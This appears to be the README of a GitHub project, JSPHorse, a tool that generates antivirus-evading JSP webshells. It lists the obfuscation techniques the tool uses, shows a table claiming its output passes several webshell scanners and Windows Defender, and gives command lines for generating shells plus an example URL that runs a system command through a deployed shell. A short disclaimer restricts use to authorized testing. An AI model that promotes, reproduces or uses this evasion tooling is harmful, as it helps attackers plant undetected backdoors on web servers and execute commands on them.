# JSPHorse

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/JavaParser-3.23.1-blue)
![](https://img.shields.io/badge/Java-8-red)

## 简介

一个JSP免杀Webshell生成器，目前仅支持普通回显Webshell，后续可能支持冰蝎等，核心技术为Java的AST库JavaParser

```txt
　　 へ　　　　　／|
　　/＼7　　　 ∠＿/
　 /　│　　 ／　／
　│　Z ＿,＜　／　　 /`ヽ
　│　　　　　ヽ　　 /　　〉
　 Y　　　　　`　 /　　/
　?●　?　●　　??〈　　/
　()　 へ　　　　|　＼〈
　　>? ?_　 ィ　 │ ／／
　 / へ　　 /　?＜| ＼＼
　 ヽ_?　　(_／　 │／／
　　7　　　　　　　|／
　　＞―r￣￣~∠--|
```

特点：

- Java反射调用
- 双重异或加密数字常量
- 凯撒密码随机偏移并结合Base64双重加密字符串常量
- 使用控制流平坦化并随机生成分发器
- 所有标识符全部替换为随机字符串
- 支持全局Unicode编码
- 每次执行都会生成完全不同的马（结构相同内容不同）
- 参考三梦师傅代码完成Javac动态编译class进一步免杀
- 集成KpLi0rn师傅提供的ScriptEngine免杀（未测试）

简单测试了免杀效果：

| 名称 | 测试结果 |
| :----: | :----: |
| 百度WEBDIR+ | ![](https://img.shields.io/badge/pass-green) |
| 河马SHELLPUB | ![](https://img.shields.io/badge/pass-green) |
| Windows Defender | ![](https://img.shields.io/badge/pass-green) |

## Quick Start

在Github右侧Release页面下载

生成标准形式Webshell

`java -jar JSPHorse.jar -p your_password`

全局Unicode编码（JSP支持全局Unicode编码）

`java -jar JSPHorse.jar -p your_password -u`

生成超级版Webshell（Javac动态编译class）

`java -jar JSPHorse.jar -p your_password --super`

使用木头神提供的JS免杀（未测试）

`java -jar JSPHorse.jar -p your_password -j`

如何使用？

http://xxx/1.jsp?pwd=your_password&cmd=calc.exe

## 免责申明

未经授权许可使用`JSPHorse`攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的

